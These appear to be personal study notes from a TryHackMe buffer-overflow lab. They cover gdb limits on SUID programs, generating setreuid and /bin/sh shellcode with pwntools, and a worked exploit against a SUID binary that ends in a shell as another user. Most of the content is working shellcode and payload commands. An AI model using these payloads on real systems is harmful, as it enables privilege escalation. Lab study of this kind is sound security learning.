
### Debugging SUID and SGID

You can only debug a setuid or setgid program if the debugger is running as root. Otherwise you could just call gdb on /bin/su and have root. If you run Gdb as root, you'll be able to run your program, but you'll only be observing its behavior when run by root.

If you need to debug the program when it's not started by root, start the program outside the debugger, make it pause in some fashion and `attach` the process.


### How do we run shellcode with the SUID permission?

We need to within the code set the suid:

We can generate shellcode with the shellcraft functionality of pwntools

At the command line:
```sh
pwn shellcraft --format d amd64.linux.setreuid 1002
\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
```

We can get the code for setreuid
```sh
┌──(kali㉿kali)-[~/bof]
└─$ pwn shellcraft --format d amd64.linux.setreuid 1001
\x31\xff\x66\xbf\xe9\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
```

and for sh
```sh
┌──(kali㉿kali)-[~/bof]
└─$ pwn shellcraft --format d amd64.linux.sh           
\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05
```

or both at the same time
```sh
┌──(kali㉿kali)-[~/bof]
└─$ pwn shellcraft --format d amd64.linux.setreuid 1001 + amd64.linux.sh
\x31\xff\x66\xbf\xe9\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05
```

or
```sh
┌──(kali㉿kali)-[~/bof]
└─$ pwn shellcraft --format d i386.linux.setreuid 1001 + i386.linux.sh 
\x31\xdb\x66\xbb\xe9\x03\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80
```

In python:
```python
print("\nGenerating shellcode for a SUID binary - user id 1001")
context.arch = "i386"
context.bits = 32
shell_i386 = shellcraft.i386.linux.setreuid("1001")+shellcraft.i386.linux.sh()
#print(shell_i386) # outputs assembler code
shellcode = asm(shell_i386)
print("Shellcode: "+str(shellcode)) # generates machine code in bytes format
print("Shellcode length: "+str(len(shellcode))+"bytes")
```

Example from [[Examples/THM Buffer Overflows/overflow-3 - suid binary|overflow-3 - suid binary]]
```sh
[user1@ip-10-10-60-107 overflow-3]$ ./buffer-overflow $(python -c "print('\x90'*(152-40-10)+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x41'*10+'\x80\xe2\xff\xff\xff\x7f\x00\x00')")
Here's a program that echo's out your input
������������������������������������������������������������������������������������������������������j;XH1�I�//bin/shI�APH��RWH��j<XH1�AAAAAAAAAA�����
sh-4.2$ whoami
user1
sh-4.2$ exit
exit
[user1@ip-10-10-60-107 overflow-3]$ ./buffer-overflow $(python -c "print('\x90'*(152-14-40-10)+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05'+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x41'*10+'\x80\xe2\xff\xff\xff\x7f\x00\x00')")
Here's a program that echo's out your input
����������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1�AAAAAAAAAA�����
sh-4.2$ whoami
user2
sh-4.2$ cat secret.txt
omgyoudidthissocool!!
```




